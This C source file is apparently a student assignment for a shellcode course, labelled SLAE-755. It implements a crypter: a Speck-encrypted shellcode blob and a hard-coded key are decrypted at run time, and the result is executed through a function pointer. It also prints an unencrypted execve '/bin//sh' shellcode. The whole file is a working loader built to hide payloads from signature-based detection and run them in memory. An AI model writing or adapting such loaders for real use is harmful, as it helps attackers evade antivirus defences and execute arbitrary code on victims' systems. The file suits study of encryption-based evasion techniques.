// Student:   SLAE-755
#include <speck/speck.h>
#include <stdio.h>
#include <string.h>
#include <cstdlib>
#include <random>



static const uint8_t s_key_128256_stream[32] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
};

static const uint8_t encrypted_shellcode[] = \
	"\x3c\x0c\x16\x83\x00\xc6\x01\xc5\xc5\xd0\xe6\xd6\x80\x4c\x79\xb1\x0d\xae\x82\x74\x03\x97\xae\x3a\x00\x3c\xac\xc2\x0d\x22\x86\x1d";

void generate_iv(uint8_t *iv, size_t iv_len) {
    std::random_device rd;  //Will be used to obtain a seed for the random number engine
    std::mt19937 gen(rd()); //Standard mersenne_twister_engine seeded with rd()
    std::uniform_int_distribution<> dis;

    for(int i=0; i<iv_len; i++) {
        iv[i] = static_cast<uint8_t>(dis(gen));
    }
}

void show_array(const char *explain, const uint8_t *array, size_t len) {
    printf("%20s ", explain);
    for(int i=0; i < len; i++) {
        printf("%02x ", array[i]);
    }
    printf("\n");
}

void show_shellcode(const char *explain, const uint8_t *array, size_t len) {
    printf("%20s ", explain);

    for(int i=0; i < len; i++) {
        printf("\\x%02x", array[i]);
    }
    printf("\n");
}


int main() {

    // ECB 128256 stream encrypt & decrypt
    {
        speck_ctx_t *ctx = speck_init(SPECK_ENCRYPT_TYPE_128_256, s_key_128256_stream, sizeof(s_key_128256_stream));
        if(!ctx) return 1;

        int i;
        size_t siz = sizeof(encrypted_shellcode);
        uint8_t *decrypted_text = (uint8_t*) calloc(1, siz);
        uint8_t *encrypted_text = (uint8_t*) calloc(1, siz);




    	int chunks = sizeof(encrypted_shellcode)/16;
        //if(siz % 16) chunks++;


    	printf("chunks: %d\n", chunks);


        printf("ECB stream ph1 encryption\n");

    	for(int i=0; i < chunks; i++){
            memcpy(encrypted_text+16*i, encrypted_shellcode+16*i, 16);


            //Decrypt chunks
    	    speck_ecb_decrypt(ctx, encrypted_text+16*i, decrypted_text+16*i, 16);
            show_array("encrypted chunk :", encrypted_text+16*i, 16);
            show_array("decrypted chunk :", decrypted_text+16*i, 16);

    	}
        printf("\n");

        //remove null bytes
        int pos = 0;
        for(pos = 0; pos < siz; pos++){
            if(decrypted_text[pos]=='\0')
                break;
        }

        uint8_t *shellcode = (uint8_t*) calloc(1, pos);
        memcpy(shellcode, decrypted_text, pos);

    	show_shellcode("decrypted shellcode  :", shellcode, pos);

        printf("\n");


        unsigned char code[] = \
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


    	show_shellcode("plain text shellcode  :", code, sizeof(code));


        printf("\nRunning shellcode...\n");
        int (*ret)() = (int(*)())shellcode;
        ret();


        free(decrypted_text);
        free(encrypted_text);
        free(shellcode);


        speck_finish(&ctx);
    }


    return 0;
}

